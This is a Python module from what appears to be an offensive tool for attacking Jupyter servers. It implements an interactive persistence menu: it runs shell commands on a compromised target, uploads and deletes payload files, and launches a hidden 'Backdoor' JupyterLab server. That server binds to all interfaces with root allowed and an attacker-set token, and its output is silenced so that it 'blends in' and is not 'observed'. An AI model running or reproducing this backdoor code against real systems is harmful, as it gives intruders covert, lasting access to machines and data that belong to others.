import asyncio
import inquirer
import time
from vger.attack import Attack
from vger.connection import Connection


class Persist:
    def __init__(self, host_or_connection, secret=""):
        if isinstance(host_or_connection, Connection):
            self.connection = host_or_connection
        else:
            self.connection = Connection(host_or_connection, secret)

    def persist(self):
        if self.connection.first_time_in_menu["persist"]:
            self.connection.first_time_in_menu["persist"] = False
            self.connection.print_with_rule(
                """
                Develop alternate access mechanisms.
                [bold red]Run shell commands[/bold red] to change server state.
                [bold red]Upload[/bold red] and [bold red]Delete[/bold red] files to manage payloads.
                Launch a [bold red]Backdoor[/bold red] Jupyter server so you have a way back that blends in.
                """,
                category="Persist",
            )
        persist_menu = [
            inquirer.List(
                "option",
                "How would you like to establish persistence?",
                choices=[
                    "Run shell command",
                    "Backdoor",
                    "List dir or get file",
                    "Upload file",
                    "Delete file",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(persist_menu)
        match answer["option"]:
            case "Run shell command":
                self.run_in_shell()
                self.persist()
            case "Backdoor":
                self.jupyter_backdoor()
                self.persist()
            case "List dir or get file":
                self.list_dir()
                self.persist()
            case "Upload file":
                self.upload()
                self.persist()
            case "Delete file":
                self.delete()
                self.persist()
            case "Back to main menu":
                self.menu()
        
    def jupyter_backdoor(self, port=7777, secret=""):
        """
        Launches a new JupyterLab instance. This can be useful for browser-based interaction that you don't want observed.
        """
        loop = asyncio.get_event_loop()
        if len(secret) == 0:
            config = [
                inquirer.Text(
                    "port",
                    message="What port do you want your Jupyter Server to run on?",
                ),
                inquirer.Text(
                    "secret",
                    message="What password do you want to use for authentication?",
                ),
            ]
            config = inquirer.prompt(config)
            port = config["port"]
            secret = config["secret"]
        if self.target:
            loop.run_until_complete(
                Attack(self.connection).attack_session(
                    self.connection,
                    self.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.print_with_rule(f"Backdoor attempted on {port}")
        else:
            self.connection.print_with_rule("Target needed for backdoor")
            if self.pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.print_with_rule(
                    "Attempting to spawn Jupyter from shell"
                )
                self.connection.print_with_rule("May fail due to missing dependencies")
                self.connection.print_with_rule("Verify success manually")
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    Attack(self.connection).run_ephemeral_terminal(
                        self.connection, launch_jupyter, stdout=False
                    )
                )
                self.connection.print_with_rule(f"Backdoor attempted on {port}")

    def export_console(self):
        """
        Save anything that's been printed to the console.
        """
        answer = [
            inquirer.Path(
                "path",
                message="What directory would you like to save your output?",
                path_type=inquirer.Path.DIRECTORY,
                exists=True,
            )
        ]
        answer = inquirer.prompt(answer)
        log_path = f"{answer["path"]}vger-{time.strftime("%Y%m%d-%H%M%S")}.log"
        self.connection.con.save_text(log_path)
        self.connection.print_with_rule(f"Log saved to {log_path}")
